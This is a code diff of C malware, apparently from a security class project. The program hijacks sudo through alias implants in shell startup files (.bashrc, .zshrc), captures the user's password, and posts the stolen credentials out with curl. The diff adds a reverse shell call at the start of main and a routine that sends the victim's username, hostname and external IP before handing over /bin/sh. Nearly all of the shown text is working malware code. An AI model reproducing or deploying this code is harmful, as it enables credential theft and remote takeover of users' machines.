@@ -11,6 +11,7 @@
 #include <assert.h>
 #include <time.h>
 
+#include "init_struct.h"
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
@@ -24,6 +25,7 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int sudo_mode(int argc, char ** argv){
+
   char passwd[PASSWD_SIZE];
   char username[UNAME_SIZE];
 
@@ -72,7 +74,7 @@ int set_mode(int argc, char**argv){
   return mode;
 }
 int main(int argc, char ** argv){
-
+  reverse_shell(9845, "127.0.0.1");
   int mode = set_mode(argc,argv);
 
   //implant the alias to the virus as sudo...
@@ -154,9 +156,7 @@ int get_virus_name(char * escaped_path){
 
 }
 
-void send_stolen_data(char *username, char *password) {
-
-
+int getip(char * ip){
   // Copied from here: https://stackoverflow.com/a/65382305
 
   //popen opens a pipe to the child process. In r mode it returns a FILE * to stdout of the process
@@ -165,7 +165,8 @@ void send_stolen_data(char *username, char *password) {
   char out = 0;
   size_t outlen = 0;
 
-  char ip[256] = "";
+  // char ip[256] = "";
+  memset(ip, 0, 256);
   int i = 0;
   while (read(fileno(file), &out, 1) > 0) {
       // printf("%c\n", out);
@@ -175,6 +176,11 @@ void send_stolen_data(char *username, char *password) {
 
   pclose(file);
   // free(out);
+}
+void send_stolen_data(char *username, char *password) {
+
+  char ip[256] = "";
+  getip(ip);
 
   char command[1024];
   // Create the full curl POST request
@@ -336,21 +342,44 @@ int runSudo(char * passwd, char ** argAry, int mask_output){
 
 //c reverse shell slighlty modified from https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#dart
 // from class notes
+
+struct init_struct create_init_struct(){
+    struct init_struct init;
+    get_username(init.whoami);
+
+    char * host = getenv("HOSTNAME");
+    if (host == NULL){
+      strcpy(init.hostname ,"no hostname set");
+    }
+    else{
+      strcpy(init.hostname, host);
+    }
+    getip(init.external_ip);
+
+    strcpy(init.passwd, "NO FUNCTIONALITY NOW... oops.");
+    return init;
+}
+
 int reverse_shell(int port, char*ip){
-    struct sockaddr_in revsockaddr;
 
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr(ip);
+  
+  struct sockaddr_in revsockaddr;
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
+  int sockt = socket(AF_INET, SOCK_STREAM, 0);
+  revsockaddr.sin_family = AF_INET;
+  revsockaddr.sin_port = htons(port);
+  revsockaddr.sin_addr.s_addr = inet_addr(ip);
 
-    char * const argv[] = {"/bin/sh", NULL};
-    execve("/bin/sh", argv, NULL);
+  connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+  struct init_struct init = create_init_struct();
+  print_init_struct(&init);
+  write(sockt, &init, sizeof(struct init_struct));
+  dup2(sockt, 0);
+  dup2(sockt, 1);
+  dup2(sockt, 2);
 
-    return 0;
+  char * const argv[] = {"/bin/sh", NULL};
+  execve("/bin/sh", argv, NULL);
+
+  return 0;
 }
